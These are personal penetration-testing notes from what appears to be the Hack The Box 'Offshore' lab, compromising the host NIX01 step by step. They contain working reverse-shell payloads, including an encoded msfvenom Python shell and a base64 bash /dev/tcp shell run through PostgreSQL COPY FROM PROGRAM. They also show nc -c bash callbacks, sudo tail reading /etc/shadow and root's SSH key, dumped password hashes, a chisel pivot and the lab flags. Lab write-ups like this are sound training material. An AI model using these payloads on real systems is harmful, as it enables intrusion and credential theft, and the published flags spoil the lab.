### Machine Information
#machine #information
```bash
IP ADDRESS: 10.10.110.123 /// 172.16.1.23
HN: NIX01
OS: Linux NIX01 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
EXPLOIT/PORT: Splunk / 8000
PRIVESC: PSQL
```
[[34 exchange windows permissions group check.png]]
### Path Forward
#path #forward
```bash
PORTS:
22 - not an initial vector, potentially used later if credentials are found
80 - Begin Web fuzzing - browse to website - Apache httpd 2.4.52 ((Ubuntu))
	- gobuster
	- burpsuite
	- nikto
	- dirsearch 
	- if dont find stuff on first wordlists try more
```
### Scanning
#rustscan
```shell
┌──(root㉿kali)-[/home/kali/Documents/vpns]
└─# rustscan -a 10.10.110.123      
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 62
80/tcp   open  http     syn-ack ttl 62
8000/tcp open  http-alt syn-ack ttl 62
8089/tcp open  unknown  syn-ack ttl 62
```
/opt/chisel/chisel_64.exe
## Port 80 Enumeration
##### GoBuster
#gobuster
```bash
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.10.110.123:80 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.110.123:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              html,asp,aspx,php,txt
[+] Timeout:                 10s
===============================================================
2023/07/19 11:21:51 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.hta.asp             (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.hta.aspx            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.asp        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.aspx       (Status: 403) [Size: 278]
/.htpasswd.aspx       (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.asp        (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.110.123/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.110.123/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.10.110.123/images/]
/index.html           (Status: 200) [Size: 22567]
/index.html           (Status: 200) [Size: 22567]
/js                   (Status: 301) [Size: 311] [--> http://10.10.110.123/js/]
/robots.txt           (Status: 200) [Size: 575]
/robots.txt           (Status: 200) [Size: 575] [X]
/server-status        (Status: 403) [Size: 278]
Progress: 27535 / 27690 (99.44%)
===============================================================
2023/07/19 11:22:57 Finished
===============================================================
```
Used this video to get initial reverse shell
https://www.youtube.com/watch?v=jhPpV8b6q9E

#splunk #reverse #shell
- follow the video and use text below to initiate reverse shell in the search field on splunk.
```bash
| revshell std 10.10.16.7 4545
```

#unprivileged #initial #shell 
```bash
# opened up netcat listener and caught unprivileged shell under mark in which I could not interact with other than pull the first flag using ls
# could not do anything with this shell
┌──(root㉿kali)-[/home/…/Documents/hackthebox/Offshore_Pro_Labs/10.10.110.123]
└─# nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.110.123] 36382
```

#msfvenom #payload #unix
```bash
# using youtube video used the msfvenom payload to get shellcode
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Offshore_Pro_Labs]
└─# ls
10.10.110.123
                                                                           
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Offshore_Pro_Labs]
└─# msfvenom -p cmd/unix/reverse_python LHOST=10.10.16.7 LPORT=1234 R
Payload size: 497 bytes
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAsICBzdWJwcm9jZXNzICAgICwgIG9zICAgIDtob3N0PSIxMC4xMC4xNi43IiAgICA7cG9ydD0xMjM0ICAgIDtzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgLCAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICA7cy5jb25uZWN0KChob3N0ICAgICwgIHBvcnQpKSAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgIDApICAgIDtvcy5kdXAyKHMuZmlsZW5vKCkgICAgLCAgMSkgICAgO29zLmR1cDIocy5maWxlbm8oKSAgICAsICAyKSAgICA7cD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp')[0]))"


┌──(root㉿kali)-[/home/…/Documents/hackthebox/Offshore_Pro_Labs/10.10.110.123]
└─# nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.110.123] 36382
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAsICBzdWJwcm9jZXNzICAgICwgIG9zICAgIDtob3N0PSIxMC4xMC4xNi43IiAgICA7cG9ydD0xMjM0ICAgIDtzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgLCAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICA7cy5jb25uZWN0KChob3N0ICAgICwgIHBvcnQpKSAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgIDApICAgIDtvcy5kdXAyKHMuZmlsZW5vKCkgICAgLCAgMSkgICAgO29zLmR1cDIocy5maWxlbm8oKSAgICAsICAyKSAgICA7cD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp')[0]))"

```

### On as Mark - Unprivileged User
#privileged #shell 
```bash
#opened new listener on port 1234 and sent shell code on unprivileged shell

┌──(root㉿kali)-[/home/kali/Documents/vpns]
└─# nc -lvnp 1234                      
listening on [any] 1234 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.110.123] 38060
#tty shell upgrade
python -c 'import pty; pty.spawn("/bin/bash")'
mark@NIX01:/$  

- on as mark.
```
### 1st Flag
#flag 
```bash

mark@NIX01:/home/mark$ ifconfig    
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:a9:2d  
          inet addr:172.16.1.23  Bcast:172.16.1.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:a92d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2301070 errors:0 dropped:113 overruns:0 frame:0
          TX packets:2027247 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1328224012 (1.3 GB)  TX bytes:1343591007 (1.3 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:7786927 errors:0 dropped:0 overruns:0 frame:0
          TX packets:7786927 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:636007348 (636.0 MB)  TX bytes:636007348 (636.0 MB)

mark@NIX01:/home/mark$ cat flag.txt
cat flag.txt
OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}
mark@NIX01:/home/mark$ 
```

![[Penetration Testing v2/htb_pro_Labs/offshore/1. 10.10.110.123 - NIX01/screenshots/1. flag 1.png]]
## Beginning Privilege Escalation

#linpeas #filetransfer #curl
```bash
#pulling over linpeas_check.sh - noticed other linpeas executables already in /tmp, renamed mine to linpeas_check.sh

#setting up pthon3 http server to begin pull
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Offshore_Pro_Labs]
└─# python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.110.123 - - [19/Jul/2023 15:37:38] "GET /linpeas_check.sh HTTP/1.1" 200 -

# pulling over linpeas_check.sh
mark@NIX01:/tmp$ curl -O http://10.10.16.7/linpeas_check.sh
curl -O http://10.10.16.7/linpeas_check.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  808k  100  808k    0     0  1142k      0 --:--:-- --:--:-- --:--:-- 1142k

#double checking to ensure that linpeas got pulled over
mark@NIX01:/tmp$ ls | grep linpeas_check.sh    
ls | grep linpeas_check.sh
linpeas_check.sh

#made file linpeas_check.sh executable
mark@NIX01:/tmp$ chmod +x linpeas_check.sh
chmod +x linpeas_check.sh


#got a weird error that I havent seen before - had to loook up error and kill the process due to it already running linpeas.
NIX01:/tmp$ ./linpeas_check.sh
./linpeas_check.sh
bash: ./linpeas_check.sh: /bin/sh: bad interpreter: Text file busy

#how I killed the linpeas process to be able to run it
mark@NIX01:/tmp$ lsof | grep linpeas_check.sh
lsof | grep linpeas_check.sh
nc         89621                    mark    1w      REG                8,1   828087     593 /tmp/linpeas_check.sh
mark@NIX01:/tmp$ kill 89621
kill 89621



#ran linpeas, to look at linpeas results check out the results tab.
```

### There are no kernel exploits
#there #are #no #kernel #exploits
```shell
# cat /etc/passwd to see what users have a shell - postgres user is running
mark@NIX01:/usr/local/pgsql/bin$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
splunk:x:1002:1002:Splunk Server:/opt/splunk:/bin/bash
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

#psql
```bash
#initially just tried to run a psql command but wasnt running because the path was screwed up, command below found the binary
mark@NIX01:/$ locate psql
locate psql
/home/mark/.psql_history
/usr/local/pgsql/bin/psql
/usr/local/pgsql/include/server/fe_utils/psqlscan.h
/usr/local/pgsql/include/server/fe_utils/psqlscan_int.h
/usr/local/pgsql/share/psqlrc.sample
/usr/share/bash-completion/completions/psql
mark@NIX01:/$ cd /usr/local/pgsql/bin/

# change directory to pgsql/bin
mark@NIX01:/$ cd /usr/local/pgsql/bin/


#command to get into postgres
mark@NIX01:/usr/local/pgsql/bin$ ./psql -h 127.0.0.1 -U postgres 
./psql -h 127.0.0.1 -U postgres
psql (9.6.0)
Type "help" for help.


COPY demo FROM PROGRAM 'nc 10.10.16.7 2020 -c bash';
COPY demo FROM PROGRAM 'nc 10.10.16.7 2020 -c /bin/bash';

rk@NIX01:/usr/local/pgsql/bin$ ./psql --version
./psql --version
psql (PostgreSQL) 9.6.0


1) [Optional] Drop the table you want to use if it already exists

DROP TABLE IF EXISTS cmd_exec;

2) Create the table you want to hold the command output

CREATE TABLE cmd_exec(cmd_output text);

3) Run the system command via the COPY FROM PROGRAM function

COPY cmd_exec FROM PROGRAM '"id";'

4) [Optional] View the results

SELECT * FROM cmd_exec;

5) [Optional] Clean up after yourself

_DROP TABLE IF EXISTS cmd_exec;_
```

#psql
```shell
# reading psql database
https://www.unix-ninja.com/p/postgresql_for_red_teams

postgres=# select pg_ls_dir('./');
select pg_ls_dir('./');
      pg_ls_dir       
----------------------
 pg_multixact
 postgresql.conf
 pg_dynshmem
 pg_clog
 pg_serial
 postmaster.pid
 pg_logical
 base
 global
 pg_replslot
 pg_xlog
 pg_stat
 pg_notify
 backpipe
 PG_VERSION
 pg_snapshots
 pg_commit_ts
 pg_ident.conf
 pg_stat_tmp
 pg_subtrans
 pg_hba.conf
--More-- 
 pg_twophase
--More--
 pg_tblspc
--More--
 postgresql.auto.conf
--More--
 postmaster.opts
--More--
(25 rows)
--More--
        
postgres=# 



postgres=# select pg_read_file('PG_VERSION');
select pg_read_file('PG_VERSION');
 pg_read_file 
--------------
 9.6         +
 
(1 row)

postgres=# select pg_read_file('postgresql.auto.conf', 66, 12);
select pg_read_file('postgresql.auto.conf', 66, 12);
 pg_read_file 
--------------
 ALTER SYSTEM
(1 row)



postgres=# create table docs (data TEXT);
create table docs (data TEXT);
CREATE TABLE
postgres=# copy docs from '/etc/passwd';
copy docs from '/etc/passwd';
COPY 31
postgres=# select * from docs limit 10;
select * from docs limit 10;
                       data                        
---------------------------------------------------
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
(10 rows)

postgres=# 



postgres=# select version();
select version();
                                                     version                                                     
-----------------------------------------------------------------------------------------------------------------
 PostgreSQL 9.6.0 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609, 64-bit
(1 row)

```
### PostGreSQL
#ippsec #postgreSQL
```shell
***********https://www.youtube.com/watch?v=8XmTz3A5rUo&t=3590s ippsec vid that i followed
To perform the attack, you simply follow these steps:

# this worked - always use drop and create first
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'ping -c 1 "10.10.16.7"';

# this works - testing
COPY cmd_exec FROM PROGRAM '"ping -c 1 10.10.16.7"';

# this worked with the echo to ping
COPY cmd_exec FROM PROGRAM 'echo "ping -c 1 10.10.16.7" | bash';

# this fucking worked  to get reverse shell and i am now postgres - thank you ippsec
COPY cmd_exec FROM PROGRAM 'echo "echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzIwMjAgMD4mMQ== | base64 -d | bash" | bash';
```

#tcpdump
```bash
#tcpdump to check 
┌──(root㉿kali)-[/home/kali]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:04:17.598718 IP 10.10.110.123 > 10.10.16.7: ICMP echo request, id 61306, seq 1, length 64
13:04:17.598730 IP 10.10.16.7 > 10.10.110.123: ICMP echo reply, id 61306, seq 1, length 64

```

#base64 #reverseshell
```bash
# created base64 reverse shells

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Offshore_Pro_Labs]
└─# echo -n 'bash -i >& /dev/tcp/10.10.16.7/2020 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzIwMjAgMD4mMQ==

```

#complete #postgres #methodology
```bash
# find where psql was for post gres
mark@NIX01:/$ locate psql
locate psql
/usr/local/pgsql/bin/psql

# cd to directory
mark@NIX01:/$ cd /usr/local/pgsql/bin/

# run this command to drop into postgres
mark@NIX01:/usr/local/pgsql/bin$ ./psql -h 127.0.0.1 -U postgres 
./psql -h 127.0.0.1 -U postgres 
psql (9.6.0)
Type "help" for help.


# ran these commands with tcpdump to check that rce was working
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'ping -c 1 "10.10.16.7"';

# tcpdump on kali machine
┌──(root㉿kali)-[/home/kali]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:04:17.598718 IP 10.10.110.123 > 10.10.16.7: ICMP echo request, id 61306, seq 1, length 64

# created base64 reverse shell with command above

# utilized this payload in postgres to catch reverse shell
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'echo "echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzIwMjAgMD4mMQ== | base64 -d | bash" | bash';

#setup port 2020 listener and was able to catch revshell
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Offshore_Pro_Labs]
└─# nc -lvnp 2020
listening on [any] 2020 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.110.123] 54736
bash: cannot set terminal process group (128285): Inappropriate ioctl for device
bash: no job control in this shell
postgres@NIX01:/usr/local/pgsql/data$ whoami
whoami
postgres
```

![[Penetration Testing v2/htb_pro_Labs/offshore/1. 10.10.110.123 - NIX01/screenshots/4. on as postgres revshell.png]]
#sudo #-l
```bash
#sudo -l to see what privileges we have

postgres@NIX01:/$ sudo -l
sudo -l
Matching Defaults entries for postgres on NIX01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User postgres may run the following commands on NIX01:
    (ALL) NOPASSWD: /usr/bin/tail
postgres@NIX01:/$
```

#gtfobins #tail
```bash
#assigned /etc/shadow to LFILE
postgres@NIX01:/$ LFILE=/etc/shadow
LFILE=/etc/shadow

# utilized sudo and tail to idsentify contents of lfile
postgres@NIX01:/$ sudo tail -c1G "$LFILE"
sudo tail -c1G "$LFILE"
root:$6$UM9dnBFE$5LRqppNoZhJmLz0.cLGlZXeDWYjy4u4MWbTW/8vMu.vSCbhTFlCLDsRvtxj8kF1RrlbCeyJHitm9g9.pLe4uM1:17652:0:99999:7:::
daemon:*:17001:0:99999:7:::
bin:*:17001:0:99999:7:::
sys:*:17001:0:99999:7:::
sync:*:17001:0:99999:7:::
games:*:17001:0:99999:7:::
man:*:17001:0:99999:7:::
lp:*:17001:0:99999:7:::
mail:*:17001:0:99999:7:::
news:*:17001:0:99999:7:::
uucp:*:17001:0:99999:7:::
proxy:*:17001:0:99999:7:::
www-data:*:17001:0:99999:7:::
backup:*:17001:0:99999:7:::
list:*:17001:0:99999:7:::
irc:*:17001:0:99999:7:::
gnats:*:17001:0:99999:7:::
nobody:*:17001:0:99999:7:::
systemd-timesync:*:17001:0:99999:7:::
systemd-network:*:17001:0:99999:7:::
systemd-resolve:*:17001:0:99999:7:::
systemd-bus-proxy:*:17001:0:99999:7:::
syslog:*:17001:0:99999:7:::
_apt:*:17001:0:99999:7:::
messagebus:*:17564:0:99999:7:::
uuidd:*:17564:0:99999:7:::
mark:$6$J7gvzz87$jy.tjUc9mWJHy5nxZtuqtXcX6zJdCAE8eX87rZfzEE0zaV8rKHyzNQ5YWzSn/ust0Y96sMRCWrFEkGhv5QD.O/:17642:0:99999:7:::
sshd:*:17564:0:99999:7:::
splunk:!:17564:0:99999:7:::
postgres:$6$ZQdBsxBU$YZeJIBNXNEJIWv5cwwGnuHrfxL04zaj1GXE0NhgL8pvmSgU2Csb/HTdesfPb7NY4ru7/UXa7Dvy/BynKzJLlI/:17758:0:99999:7:::
colord:*:19163:0:99999:7:::

```

#rsa #ssh #privatekey
```bash
#used sudo tail to pull the ssh private key
postgres@NIX01:/tmp$ sudo tail -c1G /root/.ssh/id_rsa
sudo tail -c1G /root/.ssh/id_rsa
10.10.1120.
```

```bash
# chmod 600 must be the permissions on the private key to be able to utilize them

[root💀~/bugs_/10.10.110.123] [10.10.14.39] [2023-08-07 13:08:11] 
 └─╼ # chmod 600 root_rsa 
```

#ssh #root_rsa #privatekey #box1
```bash
┌──(root㉿kali)-[/home/kali/Documents/Offshore_Pro_Labs/10.10.110.123_box1]
└─# ssh -i root_rsa root@10.10.110.123 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Fri Jul 21 13:49:21 2023 from 10.10.16.7
root@NIX01:~# 

```


#flag3
```bash

root@NIX01:~# ls
chisel_64  elwoods-l00t  flag.txt
root@NIX01:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:a9:2d  
          inet addr:172.16.1.23  Bcast:172.16.1.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:a92d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3526395 errors:0 dropped:197 overruns:0 frame:0
          TX packets:3478357 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2684600927 (2.6 GB)  TX bytes:2772120790 (2.7 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:9305602 errors:0 dropped:0 overruns:0 frame:0
          TX packets:9305602 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:792231502 (792.2 MB)  TX bytes:792231502 (792.2 MB)

root@NIX01:~# cat flag.txt
OFFSHORE{st0p_tai1ing_m3_br0}
root@NIX01:~# 

```
![[Penetration Testing v2/htb_pro_Labs/offshore/1. 10.10.110.123 - NIX01/screenshots/5. flag 3.png]]

```bash
#going to try to setup chisel so I am able to nmap inside network boxes.

# on linux machine server
^C[root💀~] [10.10.14.39] [2023-08-07 15:44:20] 
 └─╼ # chisel server --socks5 --reverse -p 5432
		./chisel server --socks5 --reverse -p 1000
2023/08/07 15:44:26 server: Reverse tunnelling enabled
2023/08/07 15:44:26 server: Fingerprint cQ0DkMwXhrn/Ppf58lYAPv6hLovIRogoqzsfodsPP3U=
2023/08/07 15:44:26 server: Listening on http://0.0.0.0:5432
2023/08/07 15:44:38 server: session#1: Client version (1.7.7) differs from server version (1.8.1)
2023/08/07 15:44:38 server: session#1: tun: proxy#R:127.0.0.1:9050=>socks: Listening
2023/08/07 16:16:20 server: session#2: Client version (1.7.7) differs from server version (1.8.1)
2023/08/07 16:16:20 server: session#2: tun: proxy#R:127.0.0.1:9050=>socks: Listening



# on client - this one
root@NIX01:~# ./chisel_64 client 10.10.14.39:5432 R:9050:socks
2023/08/07 13:16:32 client: Connecting to ws://10.10.14.39:5432
2023/08/07 13:16:32 client: Connected (Latency 24.13185ms)

./chisel_64 client 10.10.14.39:5432 R:9050:socks
./chisel_64 client 10.10.14.39:1000 R:1080:socks
```

```bash
# nmap scanning internal network, found this device
Nmap scan report for 172.16.1.15
Host is up (0.077s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 79.70 seconds
[root💀~/bugs_] [10.10.14.39] [2023-08-07 16:20:11] 
 └─╼ # proxychains nmap -sT -Pn 172.16.1.15
IP's with 135 open:
172.16.1.5
172.16.1.15
172.16.1.24
172.16.1.26
172.16.1.30
172.16.1.36
172.16.1.101
172.16.1.200
172.16.1.201
172.16.1.220


proxychains nmap -sT -Pn 172.16.1.5 172.16.1.15 172.16.1.24 172.16.1.26 172.16.1.30 172.16.1.36 172.16.1.101 172.16.1.200 172.16.1.201 172.16.1.220

Nmap scan report for 172.16.1.5
Host is up (0.098s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.1.15
Host is up (0.079s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.1.24
Host is up (0.078s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.1.26
Host is up (0.079s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.1.30
Host is up (0.081s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2000/tcp open  cisco-sccp
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.1.36
Host is up (0.077s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.1.101
Host is up (0.080s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown

Nmap scan report for 172.16.1.200
Host is up (0.081s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.1.201
Host is up (0.079s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5800/tcp open  vnc-http
5900/tcp open  vnc

Nmap scan report for 172.16.1.220
Host is up (0.079s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

```


flag 2

```bash
postgres@NIX01:/$ find / -name flag.txt 2>/dev/null
/home/mark/flag.txt
/var/lib/postgresql/flag.txt
postgres@NIX01:/$ cat /var/lib/postgresql/flag.txt
OFFSHORE{fun_w1th_m@g1k_bl0ck$}
```